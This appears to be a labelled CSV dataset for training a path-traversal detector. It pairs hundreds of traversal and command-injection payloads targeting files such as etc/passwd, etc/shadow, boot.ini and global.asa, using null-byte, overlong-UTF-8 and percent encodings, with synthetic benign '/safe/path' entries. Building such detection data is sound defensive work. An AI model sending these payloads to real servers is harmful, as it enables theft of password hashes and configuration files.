Sentence,Label
..\..\..\..\..\..\..\..\..\..\etc\shadow,1
..\..\..\..\..\..\..\..\..\..\etc\passwd,1
../../../../../../../../../../../../etc/passwd%00,1
/safe/path/file160.html,0
/safe/path/file679.html,0
..\..\..\..\..\..\..\..\..\..\etc\passwd%00,1
/safe/path/file432.html,0
%0a/bin/cat%20/etc/passwd,1
/../../../../../../../../../../../etc/passwd%00.html,1
/safe/path/file497.html,0
.\.\.\.\.\.\.\.\.\.\./etc/shadow,1
/../../../../../../../../../../../boot.ini,1
/safe/path/file808.html,0
/safe/path/file965.html,0
%0a/bin/cat%20/etc/passwd,1
/safe/path/file1074.html,0
/..%c0%af../..%c0%af../..%c0%af../..%c0%af../..%c0%af../..%c0%af../etc/shadow,1
/safe/path/file744.html,0
.\.\.\.\.\.\.\.\.\.\./etc/shadow,1
/safe/path/file701.html,0
/safe/path/file1716.html,0
%0a/bin/cat%20/etc/shadow,1
/safe/path/file1964.html,0
/../../../../../../../../../../etc/passwd^^,1
/..\../..\../..\../..\../..\../..\../etc/passwd,1
/./././././././././././etc/shadow,1
..%c0%af../..%c0%af../..%c0%af../..%c0%af../..%c0%af../..%c0%af../boot.ini,1
C:/boot.ini,1
/safe/path/file1491.html,0
C:\boot.ini,1
/safe/path/file1817.html,0
../../../../../../../../../../../../boot.ini,1
/safe/path/file1916.html,0
../../../../../../../../../../../../boot.ini,1
../../../../../../../../../../../../etc/shadow,1
/../../../../../../../../../../etc/passwd^^,1
C:/boot.ini,1
/../../../../../../../../../../etc/shadow,1
/safe/path/file731.html,0
/safe/path/file1651.html,0
/./././././././././././etc/passwd,1
/safe/path/file675.html,0
/safe/path/file647.html,0
/../../../../../../../../../../../etc/passwd%00.html,1
%00/etc/passwd%00,1
/../../../../../../../../%2A,1
/safe/path/file1800.html,0
/../../../../../../../../../../etc/shadow^^,1
/safe/path/file650.html,0
../../../../../../../../../../../../etc/hosts%00,1
../../../../../../../../../../../../localstart.asp,1
/safe/path/file913.html,0
/safe/path/file1291.html,0
/safe/path/file149.html,0
\..\..\..\..\..\..\..\..\..\..\etc\shadow,1
/safe/path/file134.html,0
/..%c0%af../..%c0%af../..%c0%af../..%c0%af../..%c0%af../..%c0%af../etc/shadow,1
%00../../../../../../etc/shadow,1
/../../../../../../../../../../etc/passwd^^,1
../../../../../../../../../../../../localstart.asp%00,1
/safe/path/file1930.html,0
/safe/path/file673.html,0
/safe/path/file375.html,0
/safe/path/file1591.html,0
../../../../../../../../../../../../localstart.asp%00,1
C:/inetpub/wwwroot/global.asa,1
/../../../../../../../../../../../boot.ini,1
/safe/path/file325.html,0
/safe/path/file712.html,0
/safe/path/file277.html,0
/../../../../../../../../../../etc/passwd,1
/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/boot.ini,1
/safe/path/file1614.html,0
/safe/path/file1284.html,0
/safe/path/file1875.html,0
..\..\..\..\..\..\..\..\..\..\etc\passwd,1
C:/inetpub/wwwroot/global.asa,1
%00../../../../../../etc/passwd,1
/safe/path/file174.html,0
/safe/path/file496.html,0
/../../../../../../../../../../../etc/passwd%00.html,1
/safe/path/file1547.html,0
/safe/path/file1815.html,0
/safe/path/file243.html,0
../../../../../../../../../../../../localstart.asp%00,1
/safe/path/file686.html,0
/safe/path/file936.html,0
/safe/path/file1738.html,0
/safe/path/file471.html,0
/safe/path/file88.html,0
/safe/path/file1920.html,0
C:\boot.ini,1
/./././././././././././etc/shadow,1
/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/boot.ini,1
../../../../../../../../../../../../boot.ini,1
C:/inetpub/wwwroot/global.asa,1
/safe/path/file819.html,0
/../../../../../../../../../../etc/passwd^^,1
/safe/path/file1998.html,0
/safe/path/file420.html,0
/safe/path/file128.html,0
C:/inetpub/wwwroot/global.asa,1
/safe/path/file1889.html,0
/safe/path/file812.html,0
/safe/path/file1440.html,0
\..\..\..\..\..\..\..\..\..\..\etc\shadow%00,1
..\..\..\..\..\..\..\..\..\..\etc\passwd,1
/safe/path/file403.html,0
%00/etc/passwd%00,1
/./././././././././././boot.ini,1
/safe/path/file1635.html,0
C:\inetpub\wwwroot\global.asa,1
/safe/path/file1098.html,0
/safe/path/file1700.html,0
%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%00,1
/safe/path/file125.html,0
..\..\..\..\..\..\..\..\..\..\etc\passwd,1
../../../../../../../../../../../../boot.ini,1
/safe/path/file1605.html,0
/safe/path/file1558.html,0
%00/etc/shadow%00,1
/safe/path/file1189.html,0
/safe/path/file1589.html,0
/../../../../../../../../../../etc/passwd^^,1
/../../../../../../../../../../../boot.ini,1
\..\..\..\..\..\..\..\..\..\..\etc\passwd%00,1
/safe/path/file1063.html,0
../../../../../../../../../../../../etc/hosts,1
/safe/path/file422.html,0
/safe/path/file689.html,0
/safe/path/file818.html,0
/safe/path/file1886.html,0
/../../../../../../../../../../../etc/passwd%00.jpg,1
/safe/path/file226.html,0
/safe/path/file48.html,0
../../../../../../../../../../../../etc/hosts,1
/./././././././././././boot.ini,1
/safe/path/file1942.html,0
/safe/path/file963.html,0
/../../../../../../../../../../etc/passwd^^,1
%00../../../../../../etc/passwd,1
/./././././././././././etc/shadow,1
/safe/path/file1067.html,0
/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd,1
../../../../../../../../../../../../etc/shadow,1
%0a/bin/cat%20/etc/shadow,1
/safe/path/file1857.html,0
%00/etc/passwd%00,1
/safe/path/file868.html,0
/safe/path/file885.html,0
%00/etc/shadow%00,1
../../../../../../../../conf/server.xml,1
/safe/path/file898.html,0
../../../../../../../../../../../../etc/passwd,1
/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/boot.ini,1
/safe/path/file572.html,0
/safe/path/file1224.html,0
/../../../../../../../../%2A,1
%0a/bin/cat%20/etc/passwd,1
/safe/path/file601.html,0
/./././././././././././etc/shadow,1
/safe/path/file1153.html,0
/safe/path/file1717.html,0
/safe/path/file1351.html,0
/safe/path/file669.html,0
/safe/path/file241.html,0
/safe/path/file313.html,0
/safe/path/file1264.html,0
/../../../../../../../../../../../boot.ini%00.jpg,1
../../../../../../../../../../../../etc/passwd%00,1
/safe/path/file1536.html,0
.\.\.\.\.\.\.\.\.\.\./etc/passwd,1
/safe/path/file1340.html,0
/..\../..\../..\../..\../..\../..\../etc/shadow,1
.\.\.\.\.\.\.\.\.\.\./etc/shadow,1
/safe/path/file1457.html,0
\..\..\..\..\..\..\..\..\..\..\etc\passwd,1
../../../../../../../../../../../../localstart.asp%00,1
/safe/path/file1747.html,0
/safe/path/file1621.html,0
C:\inetpub\wwwroot\global.asa,1
/.../.../.../.../.../,1
/..\../..\../..\../..\../..\../..\../etc/shadow,1
/safe/path/file189.html,0
/safe/path/file104.html,0
../../../../../../../../../../../../boot.ini%00,1
/safe/path/file1106.html,0
/safe/path/file51.html,0
/safe/path/file538.html,0
/safe/path/file1994.html,0
/safe/path/file247.html,0
.\.\.\.\.\.\.\.\.\.\./etc/passwd,1
../../../../../../../../../../../../boot.ini,1
/safe/path/file274.html,0
/safe/path/file1266.html,0
../../../../../../../../../../../../etc/shadow%00,1
/safe/path/file377.html,0
/safe/path/file1238.html,0
/safe/path/file1538.html,0
\..\..\..\..\..\..\..\..\..\..\etc\shadow%00,1
.\.\.\.\.\.\.\.\.\.\./etc/shadow,1
/safe/path/file1227.html,0
/..%c0%af../..%c0%af../..%c0%af../..%c0%af../..%c0%af../..%c0%af../etc/passwd,1
/safe/path/file207.html,0
/safe/path/file106.html,0
/safe/path/file1772.html,0
%0a/bin/cat%20/etc/passwd,1
../../../../../../../../../../../../etc/hosts%00,1
%00/etc/shadow%00,1
/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/shadow,1
/safe/path/file685.html,0
../../../../../../../../../../../../boot.ini%00,1
/safe/path/file895.html,0
/safe/path/file1101.html,0
%0a/bin/cat%20/etc/passwd,1
C:\inetpub\wwwroot\global.asa,1
/safe/path/file1829.html,0
/safe/path/file811.html,0
../../../../../../../../../../../../etc/shadow%00,1
..%c0%af../..%c0%af../..%c0%af../..%c0%af../..%c0%af../..%c0%af../boot.ini,1
../../../../../../../../../../../../etc/hosts%00,1
/safe/path/file1524.html,0
/../../../../../../../../../../../boot.ini,1
/safe/path/file1446.html,0
/safe/path/file1546.html,0
/safe/path/file1504.html,0
/../../../../../../../../../../etc/shadow^^,1
/safe/path/file169.html,0
../../../../../../../../../../../../etc/hosts%00,1
/safe/path/file1816.html,0
%00/etc/shadow%00,1
/safe/path/file692.html,0
.\.\.\.\.\.\.\.\.\.\./etc/shadow,1
/safe/path/file1597.html,0
/../../../../../../../../../../../boot.ini,1
..\..\..\..\..\..\..\..\..\..\etc\passwd,1
/safe/path/file813.html,0
/safe/path/file10.html,0
/..\../..\../..\../..\../..\../..\../etc/passwd,1
\..\..\..\..\..\..\..\..\..\..\etc\shadow%00,1
/../../../../../../../../../../../boot.ini%00.jpg,1
%0a/bin/cat%20/etc/passwd,1
/safe/path/file1271.html,0
/safe/path/file1929.html,0
.\.\.\.\.\.\.\.\.\.\./etc/shadow,1
%0a/bin/cat%20/etc/passwd,1
\..\..\..\..\..\..\..\..\..\..\etc\shadow%00,1
/safe/path/file303.html,0
/safe/path/file1441.html,0
../../../../../../../../../../../../etc/hosts,1
../../../../../../../../../../../../localstart.asp%00,1
/../../../../../../../../../../etc/shadow^^,1
/../../../../../../../../../../etc/passwd,1
/safe/path/file1766.html,0
/../../../../../../../../../../../etc/passwd%00.jpg,1
%00/etc/shadow%00,1
/safe/path/file1559.html,0
/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/shadow,1
/safe/path/file988.html,0
\..\..\..\..\..\..\..\..\..\..\etc\passwd,1
/safe/path/file361.html,0
/safe/path/file610.html,0
../../../../../../../../../../../../etc/shadow%00,1
/safe/path/file1149.html,0
/safe/path/file1154.html,0
../../../../../../../../../../../../boot.ini,1
\&apos;/bin/cat%20/etc/passwd\&apos;,1
/../../../../../../../../../../../etc/passwd%00.html,1
/safe/path/file536.html,0
%00../../../../../../etc/passwd,1
/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd,1
/./././././././././././etc/shadow,1
%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%00,1
\..\..\..\..\..\..\..\..\..\..\etc\passwd%00,1
/safe/path/file798.html,0
/safe/path/file136.html,0
/./././././././././././etc/shadow,1
/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/shadow,1
/safe/path/file1783.html,0
C:\boot.ini,1
/safe/path/file1885.html,0
../../../../../../../../conf/server.xml,1
/safe/path/file1.html,0
/../../../../../../../../../../../etc/passwd%00.html,1
/safe/path/file1555.html,0
/safe/path/file154.html,0
/safe/path/file1114.html,0
/..\../..\../..\../..\../..\../..\../etc/passwd,1
/safe/path/file376.html,0
/safe/path/file254.html,0
/safe/path/file534.html,0
/safe/path/file1262.html,0
../../../../../../../../../../../../etc/hosts,1
C:/inetpub/wwwroot/global.asa,1
%00../../../../../../etc/shadow,1
/safe/path/file878.html,0
/./././././././././././etc/passwd,1
C:\boot.ini,1
/safe/path/file1401.html,0
.\.\.\.\.\.\.\.\.\.\./etc/shadow,1
/safe/path/file529.html,0
.\.\.\.\.\.\.\.\.\.\./etc/shadow,1
/../../../../../../../../../../../etc/passwd%00.html,1
/..%c0%af../..%c0%af../..%c0%af../..%c0%af../..%c0%af../..%c0%af../etc/passwd,1
/safe/path/file251.html,0
/safe/path/file435.html,0
/safe/path/file1781.html,0
/safe/path/file135.html,0
/safe/path/file1354.html,0
/..\../..\../..\../..\../..\../..\../etc/passwd,1
/../../../../../../../../../../../boot.ini%00.html,1
../../../../../../../../../../../../localstart.asp%00,1
\..\..\..\..\..\..\..\..\..\..\etc\passwd%00,1
/safe/path/file1347.html,0
../../../../../../../../../../../../localstart.asp,1
\..\..\..\..\..\..\..\..\..\..\etc\shadow,1
/.../.../.../.../.../,1
/./././././././././././etc/passwd,1
/safe/path/file1046.html,0
../../../../../../../../../../../../etc/passwd%00,1
/safe/path/file1221.html,0
/../../../../../../../../../../etc/passwd,1
/safe/path/file941.html,0
C:\boot.ini,1
/safe/path/file774.html,0
/../../../../../../../../../../etc/shadow^^,1
/safe/path/file347.html,0
%00../../../../../../etc/passwd,1
/safe/path/file1357.html,0
/safe/path/file715.html,0
/safe/path/file548.html,0
/safe/path/file1364.html,0
/safe/path/file517.html,0
/safe/path/file53.html,0
/safe/path/file502.html,0
/safe/path/file1310.html,0
/safe/path/file1445.html,0
/safe/path/file1141.html,0
%00../../../../../../etc/passwd,1
../../../../../../../../../../../../boot.ini%00,1
/safe/path/file108.html,0
%0a/bin/cat%20/etc/shadow,1
/safe/path/file288.html,0
../../../../../../../../../../../../boot.ini,1
/safe/path/file665.html,0
/../../../../../../../../../../etc/shadow,1
%00/etc/passwd%00,1
%00/etc/shadow%00,1
/safe/path/file1836.html,0
../../../../../../../../conf/server.xml,1
/.../.../.../.../.../,1
/safe/path/file855.html,0
/../../../../../../../../../../../boot.ini%00.jpg,1
..\..\..\..\..\..\..\..\..\..\etc\passwd,1
/../../../../../../../../../../../etc/passwd%00.html,1
/safe/path/file1928.html,0
\&apos;/bin/cat%20/etc/passwd\&apos;,1
/./././././././././././etc/passwd,1
\&apos;/bin/cat%20/etc/passwd\&apos;,1
/safe/path/file9.html,0
..\..\..\..\..\..\..\..\..\..\etc\passwd,1
/safe/path/file418.html,0
/safe/path/file1625.html,0
/safe/path/file626.html,0
/safe/path/file1037.html,0
/safe/path/file1318.html,0
..\..\..\..\..\..\..\..\..\..\etc\shadow%00,1
/safe/path/file1359.html,0
/safe/path/file577.html,0
../../../../../../../../../../../../localstart.asp%00,1
\..\..\..\..\..\..\..\..\..\..\etc\shadow,1
../../boot.ini,1
/safe/path/file736.html,0
/safe/path/file58.html,0
..\..\..\..\..\..\..\..\..\..\etc\passwd,1
/safe/path/file1759.html,0
/safe/path/file1755.html,0
/safe/path/file1830.html,0
/safe/path/file1842.html,0
.\.\.\.\.\.\.\.\.\.\./etc/passwd,1
/safe/path/file1667.html,0
/safe/path/file1685.html,0
C:\boot.ini,1
/safe/path/file378.html,0
/safe/path/file1421.html,0
/safe/path/file1832.html,0
/safe/path/file1471.html,0
/safe/path/file210.html,0
%00../../../../../../etc/shadow,1
/../../../../../../../../bin/id|,1
/safe/path/file202.html,0
/safe/path/file1870.html,0
/safe/path/file935.html,0
.\.\.\.\.\.\.\.\.\.\./etc/shadow,1
%00/etc/shadow%00,1
%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%00,1
/safe/path/file424.html,0
/safe/path/file1336.html,0
/../../../../../../../../../../../boot.ini%00.html,1
%0a/bin/cat%20/etc/shadow,1
/safe/path/file319.html,0
/safe/path/file1962.html,0
/safe/path/file1848.html,0
/safe/path/file1333.html,0
/safe/path/file299.html,0
/safe/path/file1786.html,0
/safe/path/file1275.html,0
/safe/path/file1326.html,0
../../../../../../../../../../../../etc/shadow%00,1
..\..\..\..\..\..\..\..\..\..\etc\passwd%00,1
C:/inetpub/wwwroot/global.asa,1
/safe/path/file258.html,0
/safe/path/file1688.html,0
/..\../..\../..\../..\../..\../..\../etc/passwd,1
/safe/path/file563.html,0
/../../../../../../../../../../../boot.ini%00.jpg,1
/safe/path/file1117.html,0
../../../../../../../../../../../../boot.ini%00,1
/../../../../../../../../../../../boot.ini%00.jpg,1
/safe/path/file235.html,0
/..\../..\../..\../..\../..\../..\../etc/shadow,1
/safe/path/file187.html,0
/../../../../../../../../../../../boot.ini%00.jpg,1
/safe/path/file1592.html,0
/../../../../../../../../../../etc/shadow^^,1
%00/etc/shadow%00,1
/safe/path/file584.html,0
/safe/path/file1731.html,0
/safe/path/file186.html,0
/safe/path/file664.html,0
/safe/path/file630.html,0
/safe/path/file338.html,0
/safe/path/file405.html,0
C:/inetpub/wwwroot/global.asa,1
/../../../../../../../../../../etc/passwd,1
/safe/path/file177.html,0
/safe/path/file1320.html,0
../../../../../../../../../../../../etc/hosts,1
/safe/path/file1669.html,0
/safe/path/file343.html,0
/..\../..\../..\../..\../..\../..\../etc/passwd,1
/../../../../../../../../../../../boot.ini%00.html,1
/safe/path/file627.html,0
%0a/bin/cat%20/etc/passwd,1
/safe/path/file1448.html,0
../../../../../../../../../../../../etc/hosts,1
/safe/path/file429.html,0
/safe/path/file425.html,0
/safe/path/file1203.html,0
/safe/path/file1205.html,0
/./././././././././././etc/shadow,1
/./././././././././././etc/shadow,1
../../../../../../../../../../../../boot.ini%00,1
/safe/path/file1195.html,0
/safe/path/file636.html,0
C:/inetpub/wwwroot/global.asa,1
%00/etc/shadow%00,1
/safe/path/file1241.html,0
/safe/path/file147.html,0
/safe/path/file1757.html,0
/safe/path/file1878.html,0
/safe/path/file1403.html,0
/../../../../../../../../../../etc/passwd^^,1
%00/etc/shadow%00,1
/safe/path/file185.html,0
/safe/path/file393.html,0
/./././././././././././etc/shadow,1
/safe/path/file1434.html,0
/safe/path/file1668.html,0
.\.\.\.\.\.\.\.\.\.\./etc/passwd,1
/safe/path/file1061.html,0
/..%c0%af../..%c0%af../..%c0%af../..%c0%af../..%c0%af../..%c0%af../etc/shadow,1
C:/inetpub/wwwroot/global.asa,1
C:\boot.ini,1
/./././././././././././boot.ini,1
../../../../../../../../../../../../etc/passwd%00,1
/safe/path/file1858.html,0
/safe/path/file1179.html,0
../../../../../../../../../../../../etc/passwd,1
/safe/path/file614.html,0
../../boot.ini,1
/safe/path/file852.html,0
/..%c0%af../..%c0%af../..%c0%af../..%c0%af../..%c0%af../..%c0%af../etc/passwd,1
%0a/bin/cat%20/etc/passwd,1
/safe/path/file50.html,0
/safe/path/file1183.html,0
..\..\..\..\..\..\..\..\..\..\etc\passwd%00,1
/safe/path/file1666.html,0
C:\inetpub\wwwroot\global.asa,1
../../../../../../../../../../../../etc/hosts,1
/safe/path/file1926.html,0
%0a/bin/cat%20/etc/passwd,1
C:/boot.ini,1
/safe/path/file1158.html,0
C:\boot.ini,1
/../../../../../../../../../../../boot.ini%00.jpg,1
/../../../../../../../../%2A,1
..\..\..\..\..\..\..\..\..\..\etc\passwd,1
/safe/path/file477.html,0
/safe/path/file1185.html,0
\..\..\..\..\..\..\..\..\..\..\etc\shadow%00,1
/safe/path/file23.html,0
/safe/path/file1879.html,0
.\.\.\.\.\.\.\.\.\.\./etc/passwd,1
/safe/path/file976.html,0
/safe/path/file1410.html,0
../../../../../../../../../../../../localstart.asp%00,1
/safe/path/file1091.html,0
/../../../../../../../../../../../etc/passwd%00.html,1
/safe/path/file1009.html,0
/safe/path/file985.html,0
\..\..\..\..\..\..\..\..\..\..\etc\shadow,1
/./././././././././././etc/shadow,1
C:\inetpub\wwwroot\global.asa,1
..\..\..\..\..\..\..\..\..\..\etc\passwd,1
\..\..\..\..\..\..\..\..\..\..\etc\shadow%00,1
/safe/path/file49.html,0
%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%00,1
..\..\..\..\..\..\..\..\..\..\etc\passwd,1
..\..\..\..\..\..\..\..\..\..\etc\passwd,1
.\.\.\.\.\.\.\.\.\.\./etc/shadow,1
C:\boot.ini,1
../../../../../../../../../../../../etc/hosts,1
/./././././././././././etc/shadow,1
/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/shadow,1
/safe/path/file860.html,0
/safe/path/file1248.html,0
/safe/path/file1187.html,0
../../../../../../../../../../../../localstart.asp%00,1
/safe/path/file1164.html,0
../../../../../../../../../../../../localstart.asp,1
/safe/path/file1151.html,0
C:/boot.ini,1
/safe/path/file206.html,0
/safe/path/file663.html,0
/../../../../../../../../../../etc/passwd,1
%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%00,1
/safe/path/file1197.html,0
/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd,1
../../../../../../../../../../../../etc/hosts%00,1
/safe/path/file138.html,0
/safe/path/file1914.html,0
%00/etc/shadow%00,1
/safe/path/file1480.html,0
/safe/path/file791.html,0
/./././././././././././etc/passwd,1
/safe/path/file1779.html,0
/./././././././././././boot.ini,1
/safe/path/file272.html,0
/safe/path/file696.html,0
/safe/path/file1408.html,0
/./././././././././././etc/shadow,1
/safe/path/file1862.html,0
/safe/path/file237.html,0
/safe/path/file1623.html,0
/safe/path/file1556.html,0
/safe/path/file949.html,0
/./././././././././././boot.ini,1
..\..\..\..\..\..\..\..\..\..\etc\passwd%00,1
/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd,1
\..\..\..\..\..\..\..\..\..\..\etc\shadow%00,1
/safe/path/file1405.html,0
.\.\.\.\.\.\.\.\.\.\./etc/passwd,1
../../boot.ini,1
/safe/path/file1981.html,0
/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd,1
/safe/path/file814.html,0
../../../../../../../../../../../../etc/shadow%00,1
%00/etc/passwd%00,1
/..\../..\../..\../..\../..\../..\../etc/shadow,1
C:/inetpub/wwwroot/global.asa,1
%00/etc/passwd%00,1
/safe/path/file1904.html,0
/safe/path/file1078.html,0
/safe/path/file889.html,0
/safe/path/file32.html,0
/safe/path/file658.html,0
\..\..\..\..\..\..\..\..\..\..\etc\passwd%00,1
/safe/path/file209.html,0
C:\boot.ini,1
/safe/path/file34.html,0
/safe/path/file827.html,0
/safe/path/file1687.html,0
/safe/path/file1355.html,0
